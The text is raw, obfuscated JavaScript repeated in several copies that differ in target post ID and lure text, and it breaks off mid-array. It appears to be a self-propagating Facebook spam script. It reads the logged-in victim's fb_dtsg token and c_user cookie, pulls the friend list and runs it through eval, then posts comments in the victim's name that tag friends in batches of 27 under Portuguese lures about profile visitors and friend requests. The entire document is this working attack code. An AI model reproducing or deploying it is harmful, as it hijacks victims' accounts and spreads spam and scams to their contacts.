(){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","465818833549668","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Veja Quem Visitou Seu Perfil ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","465810936883791","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=Novo Tema Do Flamengo ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","465350550263163","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Como Ganhar 5.000 pedidos de Amizade no Facebook (y) ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  Como Ganhar 5.000 pedidos de Amizade no Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "464941620304056", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "]", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text=", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", "\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", "\x26__a=1", "\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "\x26__req=q", "\x26fb_dtsg=", "\x26ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"];
    var fb_dtsg = document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];
    var user_id = document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);
    var id = _0xa22c[5];
    var arkadaslar = [];
    var svn_rev;
     
    function arkadaslari_al(id) {
        var _0x7892x7 = new XMLHttpRequest();
        _0x7892x7[_0xa22c[6]] = function () {
            if (_0x7892x7[_0xa22c[7]] == 4) {
                eval(_0xa22c[8] + _0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9], _0xa22c[10]) + _0xa22c[13]);
                for (f = 0; f < Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]] / 27); f++) {
                    mesaj = _0xa22c[10];
                    mesaj_text = _0xa22c[10];
                    for (i = f * 27; i < (f + 1) * 27; i++) {
                        if (arkadaslar[_0xa22c[16]][_0xa22c[15]][i]) {
                            mesaj += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]] + _0xa22c[22];
                            mesaj_text += _0xa22c[23] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
                        };
                    };
                    yorum_yap(id, mesaj);
                };
            };
        };
        var _0x7892x8 = _0xa22c[24];
        _0x7892x8 += _0xa22c[25];
        _0x7892x8 += _0xa22c[26];
        _0x7892x8 += _0xa22c[27];
        _0x7892x8 += _0xa22c[28] + user_id;
        _0x7892x8 += _0xa22c[29] + user_id;
        if (document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30]) >= 0) {
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[34] + _0x7892x8, true);
        } else {
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[36] + _0x7892x8, true);
        };
        _0x7892x7[_0xa22c[37]]();
    };
     
    function RandomArkadas() {
        var _0x7892xa = _0xa22c[10];
        for (i = 0; i < 9; i++) {
            _0x7892xa += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]] + _0xa22c[22];
        };
        return _0x7892xa;
    };
     
    function yorum_yap(id, _0x7892xc) {
        var _0x7892xd = new XMLHttpRequest();
        var _0x7892x8 = _0xa22c[10];
        _0x7892x8 += _0xa22c[40] + id;
        _0x7892x8 += _0xa22c[41] + encodeURIComponent(_0x7892xc);
        _0x7892x8 += _0xa22c[42];
        _0x7892x8 += _0xa22c[43];
        _0x7892x8 += _0xa22c[44];
        _0x7892x8 += _0xa22c[45];
        _0x7892x8 += _0xa22c[46];
        _0x7892x8 += _0xa22c[47] + id + _0xa22c[48];
        _0x7892x8 += _0xa22c[49];
        _0x7892x8 += _0xa22c[50];
        _0x7892x8 += _0xa22c[51];
        _0x7892x8 += _0xa22c[52];
        _0x7892x8 += _0xa22c[29] + user_id;
        _0x7892x8 += _0xa22c[53];
        _0x7892x8 += _0xa22c[54];
        _0x7892x8 += _0xa22c[55];
        _0x7892x8 += _0xa22c[56] + fb_dtsg;
        _0x7892x8 += _0xa22c[57];
        _0x7892xd[_0xa22c[35]](_0xa22c[58], _0xa22c[59], true);
        _0x7892xd[_0xa22c[62]](_0xa22c[60], _0xa22c[61]);
        _0x7892xd[_0xa22c[6]] = function () {
            if (_0x7892xd[_0xa22c[7]] == 4 && _0x7892xd[_0xa22c[63]] == 200) {
                _0x7892xd[_0xa22c[64]];
            };
        };
        _0x7892xd[_0xa22c[37]](_0x7892x8);
    };
    arkadaslari_al(id);
var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "464930496971835", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "]", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text=", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", "\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", "\x26__a=1", "\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "\x26__req=q", "\x26fb_dtsg=", "\x26ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"];
    var fb_dtsg = document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];
    var user_id = document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);
    var id = _0xa22c[5];
    var arkadaslar = [];
    var svn_rev;
     
    function arkadaslari_al(id) {
        var _0x7892x7 = new XMLHttpRequest();
        _0x7892x7[_0xa22c[6]] = function () {
            if (_0x7892x7[_0xa22c[7]] == 4) {
                eval(_0xa22c[8] + _0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9], _0xa22c[10]) + _0xa22c[13]);
                for (f = 0; f < Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]] / 27); f++) {
                    mesaj = _0xa22c[10];
                    mesaj_text = _0xa22c[10];
                    for (i = f * 27; i < (f + 1) * 27; i++) {
                        if (arkadaslar[_0xa22c[16]][_0xa22c[15]][i]) {
                            mesaj += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]] + _0xa22c[22];
                            mesaj_text += _0xa22c[23] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
                        };
                    };
                    yorum_yap(id, mesaj);
                };
            };
        };
        var _0x7892x8 = _0xa22c[24];
        _0x7892x8 += _0xa22c[25];
        _0x7892x8 += _0xa22c[26];
        _0x7892x8 += _0xa22c[27];
        _0x7892x8 += _0xa22c[28] + user_id;
        _0x7892x8 += _0xa22c[29] + user_id;
        if (document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30]) >= 0) {
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[34] + _0x7892x8, true);
        } else {
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[36] + _0x7892x8, true);
        };
        _0x7892x7[_0xa22c[37]]();
    };
     
    function RandomArkadas() {
        var _0x7892xa = _0xa22c[10];
        for (i = 0; i < 9; i++) {
            _0x7892xa += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]] + _0xa22c[22];
        };
        return _0x7892xa;
    };
     
    function yorum_yap(id, _0x7892xc) {
        var _0x7892xd = new XMLHttpRequest();
        var _0x7892x8 = _0xa22c[10];
        _0x7892x8 += _0xa22c[40] + id;
        _0x7892x8 += _0xa22c[41] + encodeURIComponent(_0x7892xc);
        _0x7892x8 += _0xa22c[42];
        _0x7892x8 += _0xa22c[43];
        _0x7892x8 += _0xa22c[44];
        _0x7892x8 += _0xa22c[45];
        _0x7892x8 += _0xa22c[46];
        _0x7892x8 += _0xa22c[47] + id + _0xa22c[48];
        _0x7892x8 += _0xa22c[49];
        _0x7892x8 += _0xa22c[50];
        _0x7892x8 += _0xa22c[51];
        _0x7892x8 += _0xa22c[52];
        _0x7892x8 += _0xa22c[29] + user_id;
        _0x7892x8 += _0xa22c[53];
        _0x7892x8 += _0xa22c[54];
        _0x7892x8 += _0xa22c[55];
        _0x7892x8 += _0xa22c[56] + fb_dtsg;
        _0x7892x8 += _0xa22c[57];
        _0x7892xd[_0xa22c[35]](_0xa22c[58], _0xa22c[59], true);
        _0x7892xd[_0xa22c[62]](_0xa22c[60], _0xa22c[61]);
        _0x7892xd[_0xa22c[6]] = function () {
            if (_0x7892xd[_0xa22c[7]] == 4 && _0x7892xd[_0xa22c[63]] == 200) {
                _0x7892xd[_0xa22c[64]];
            };
        };
        _0x7892xd[_0xa22c[37]](_0x7892x8);
    };
    arkadaslari_al(id);
var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "283956995105034", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "]", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text=", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", 